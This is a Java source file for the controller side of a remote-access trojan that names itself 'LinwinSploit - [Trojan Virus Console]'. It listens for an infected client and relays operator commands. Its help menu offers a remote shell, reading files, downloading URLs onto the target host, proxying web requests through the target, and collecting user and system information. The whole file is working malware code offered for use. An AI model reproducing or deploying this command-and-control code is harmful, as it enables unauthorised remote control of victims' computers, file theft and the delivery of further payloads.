import org.omg.PortableInterceptor.SYSTEM_EXCEPTION;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Control {
    public static PrintWriter printWriter;
    public static Socket socket;
    public static BufferedReader bufferedReader;
    public static String terminal = "LinwinSploit - [Trojan Virus Console] > ";
    public static void main(String[] args) {
        try {
            int port = Integer.parseInt(args[0]);

            ServerSocket serverSocket = new ServerSocket(port);
            System.out.println(" [INFO] LISTEN TO THE CLIENT CONNECT......");
            Socket socket = serverSocket.accept();

            Thread send_command_thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    Scanner scanner = new Scanner(System.in);
                    //System.out.print(terminal);
                    while (true) {
                        String send_command = scanner.nextLine();

                        if (send_command == null) {
                            System.out.print(terminal);
                            continue;
                        }
                        if (send_command.equals("")) {
                            System.out.print(terminal);
                            continue;
                        }

                        if (send_command.equals("help")) {
                            System.out.println("" +
                                    " |-LinwinSploit-|\n" +
                                    " 1. getinfo                 Get target control computer information.\n" +
                                    " 2. shell                   Use shell command do something on target host.\n" +
                                    " 3. cat [path]              Get a file content.\n" +
                                    " 4. wget [url]              Download a file from internet on the target host.\n" +
                                    " 5. getlogin                Get login user now.\n" +
                                    " 6. pwd                     Get virus run path.\n" +
                                    " 7. touch [path]            Create a file.\n" +
                                    " 8. mkdir [path]            Create a dictionary.\n" +
                                    " 9. requests [url]          Send a requests to other website (Use target host)\n" +
                                    " 10. exit                   Exit.");
                            printWriter.println("none");
                            printWriter.flush();
                            continue;
                        }
                        if (send_command.equals("shell")) {
                            System.out.println("Enter 'exit' to exit.");
                            terminal = "LinwinSploit - [Trojan Virus Console] (Shell) > ";
                            System.out.print(terminal);
                            while (true) {
                                Scanner command = new Scanner(System.in);
                                String send = command.nextLine();

                                if (send.equals("exit")) {
                                    terminal = "LinwinSploit - [Trojan Virus Console] > ";
                                    printWriter.println("shell:"+send);
                                    printWriter.flush();
                                    break;
                                }
                                printWriter.println("shell:"+send);
                                printWriter.flush();
                                continue;
                            }
                        }
                        if (send_command.equals("exit")) {
                            printWriter.println("exit");
                            System.exit(0);
                        }
                        else {
                            printWriter.println(send_command);
                            printWriter.flush();
                            continue;
                        }
                    }
                }
            });
            send_command_thread.start();

            OutputStream outputStream = socket.getOutputStream();
            InputStream inputStream = socket.getInputStream();
            PrintWriter printWriter = new PrintWriter(outputStream);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));

            Control.printWriter = printWriter;
            Control.socket = socket;
            Control.bufferedReader = bufferedReader;

            System.out.println();
            while (true) {
                String message = bufferedReader.readLine();
                String[] split_message = message.split("/n");

                if (message == null) {
                    break;
                }
                for (String i : split_message) {
                    System.out.println(i);
                }
                //System.out.println();
                System.out.print(terminal);
            }
            socket.close();
        }
        catch (Exception exception) {
            System.out.print(exception.getMessage());
            System.exit(0);
        }
    }
}
